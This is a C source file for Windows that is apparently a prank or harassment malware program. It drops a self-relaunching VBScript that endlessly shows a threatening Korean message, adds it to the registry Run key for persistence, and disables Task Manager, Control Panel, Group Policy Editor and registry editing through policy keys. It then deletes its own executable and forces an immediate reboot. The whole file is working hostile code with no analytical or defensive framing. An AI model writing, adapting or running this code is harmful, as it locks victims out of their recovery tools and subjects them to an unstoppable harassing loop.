#define _CRT_SECURE_NO_WARNINGS
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

#include <direct.h>
#include <lmcons.h>
#include <strsafe.h>
#include <Windows.h>

void GetUser();
void MakeFile();
void SetStartupProgram();
void UnsetStartupProgram();
void DisableTaskmanagerAndControlPaneAndLocalGroupPolicyEditorAndWindowsRegistry();
void EnableTaskmanagerAndControlPanelAndLocalGroupPolicyEditor();
void RemoveItself();
void RestartWindows();

char user[256];

int main()
{
	GetUser();

	MakeFile();

	SetStartupProgram();
	//UnsetStartupProgram();

	DisableTaskmanagerAndControlPaneAndLocalGroupPolicyEditorAndWindowsRegistry();
	//EnableTaskmanagerAndControlPanelAndLocalGroupPolicyEditor();

	RemoveItself();

	RestartWindows();

	return 0;
}

void GetUser()
{
	WCHAR temp[UNLEN + 1];
	DWORD temp_length = UNLEN + 1;
	
	memset(user, 0, sizeof(user));
	memset(temp, 0, sizeof(temp));

	GetUserNameW(temp, &temp_length);

	wcstombs(user, temp, sizeof(user));

	return;
}

void MakeFile()
{
	FILE* fp;
	char path[1024];
	char path_[1024];
	
	memset(path, 0, sizeof(path));

	strcpy(path, "C:\\Users\\");
	strcat(path, user);
	strcat(path, "\\AppData\\Local\\Unshutdownable");

	_mkdir(path);

	strcat(path, "\\Judgement.vbs");

	fp = fopen(path, "w+");

	fprintf(fp, "do\n");
	fprintf(fp, "x=msgbox(\"정말 아름다운 날이야.\" & VBCRLF & \"새들은 지저귀고, 꽃들은 피어나고...\" & VBCRLF & \"이런 날엔 너 같은 꼬마들은...\" & VBCRLF & \"지옥에서 불타 버려야 해.\",0,\"심판\")\n");
	fprintf(fp, "Set oShell = CreateObject (\"WScript.shell\")\n");

	strcpy(path_, "oShell.Run \"C:\\Users\\");
	strcat(path_, user);
	strcat(path_, "\\AppData\\Local\\Unshutdownable\\Judgement.vbs\"\n");

	fprintf(fp, path_);
	fprintf(fp, "loop\n");

	fclose(fp);

	return;
}

void SetStartupProgram()
{
	char temp[1024];

	memset(temp, 0, sizeof(temp));

	strcpy(temp, "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Judgement /t REG_SZ /d C:\\Users\\");
	strcat(temp, user);
	strcat(temp, "\\AppData\\Local\\Unshutdownable\\Judgement.vbs /f");

	system(temp);

	return;
}

void UnsetStartupProgram()
{
	system("REG DELETE \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Judgement /f");

	return;
}

void DisableTaskmanagerAndControlPaneAndLocalGroupPolicyEditorAndWindowsRegistry()
{
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f");
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\explorer\" /v nocontrolpanel /t REG_DWORD /d 1 /f");
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\" /v Restrict_Run /t REG_DWORD /d 1 /f");
	system("REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f");

	return;
}

void EnableTaskmanagerAndControlPanelAndLocalGroupPolicyEditor()
{
	system("REG DELETE \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f");
	system("REG DELETE \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\explorer\" /v nocontrolpanel /f");
	system("REG DELETE \"HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\" /v Restrict_Run /f");

	return;
}

void RemoveItself()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return;
}

void RestartWindows()
{
	system("shutdown -r -t 0");

	return;
}